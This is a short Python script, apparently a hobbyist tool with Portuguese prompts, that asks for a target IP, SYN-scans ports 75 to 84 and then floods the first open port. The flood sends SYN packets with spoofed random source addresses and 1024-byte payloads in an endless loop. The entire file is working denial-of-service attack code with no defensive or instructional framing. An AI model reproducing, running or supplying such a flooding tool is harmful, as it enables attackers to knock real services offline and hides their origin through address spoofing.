from scapy.all import *
from scapy.layers.inet import IP, TCP

def main():

    ip = input("ip para ser atacado:")

    for port in range(75, 85):
        resp = sr1(IP(dst=ip)/TCP(dport = port, flags='S'), timeout = 2)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == "SA":
            dosAttack(ip, port)
            return
        else:
            print ('Porta %d fechada' % port)
    

def dosAttack(ip_target, port_target):
    randomip = RandIP()

    conf.use_pcap = True

    ip = IP(dst=ip_target, ttl = 10, src = randomip)

    tcp = TCP(sport=RandShort(), dport=port_target, flags="S") 
    raw = Raw(b"X"*1024)
    p = ip / tcp / raw
    send(p, loop=1, verbose=0)


if __name__ == '__main__':
    main() 